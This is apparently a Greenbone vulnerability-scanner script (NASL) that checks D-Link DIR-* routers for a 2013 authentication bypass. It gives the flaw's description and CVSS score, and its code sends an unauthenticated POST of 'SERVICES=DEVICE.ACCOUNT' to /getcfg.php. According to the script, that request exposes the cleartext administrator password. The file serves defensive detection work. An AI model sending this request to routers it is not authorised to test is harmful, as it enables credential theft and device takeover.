# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

# nb: Running against all DIR devices just to be sure as the vendor is known to usually have a wide
# range of affected devices even not actually mentioned as affected.
CPE_PREFIX = "cpe:/o:dlink:dir";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803174");
  script_version("2025-06-16T05:41:07+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2025-06-16 05:41:07 +0000 (Mon, 16 Jun 2025)");
  script_tag(name:"creation_date", value:"2013-03-01 12:01:42 +0530 (Fri, 01 Mar 2013)");
  script_name("D-Link DIR-645 Router Authentication Bypass Vulnerability (Feb 2013) - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_dlink_dir_consolidation.nasl");
  script_mandatory_keys("d-link/dir/http/detected");
  script_require_ports("Services/www", 8080);

  script_xref(name:"URL", value:"https://seclists.org/bugtraq/2013/Feb/150");
  script_xref(name:"URL", value:"https://packetstorm.news/files/id/120591");

  script_tag(name:"summary", value:"D-Link DIR-645 Router devices are prone to an authentication
  bypass vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The web interface of D-Link DIR-645 routers expose several pages
  accessible with no authentication. These pages can be abused to access sensitive information
  concerning the device configuration, including the clear-text password for the administrative
  user.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to retrieve the
  administrator password and then access the device with full privileges. This will allow an
  attacker to launch further attacks.");

  script_tag(name:"affected", value:"D-Link DIR-645 devices with firmware versions prior to 1.03.
  Other models might be affected as well.");

  script_tag(name:"solution", value:"- D-Link DIR-645 devices: Update to firmware version 1.03 or
  later.

  - Other models: Please contact the vendor for more information.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if (!infos = get_app_port_from_cpe_prefix(cpe: CPE_PREFIX, service: "www"))
  exit(0);

cpe = infos["cpe"];
port = infos["port"];

if (!get_app_location(cpe: cpe, port: port, nofork: TRUE))
  exit(0);

url = "/getcfg.php";
data = "SERVICES=DEVICE.ACCOUNT";
host = http_host_name(port:port);

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(data), "\r\n",
             "\r\n", data);
res = http_keepalive_send_recv(port:port, data:req);

if(res && ">DEVICE.ACCOUNT<" >< res && "name>DIR-" >< res) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
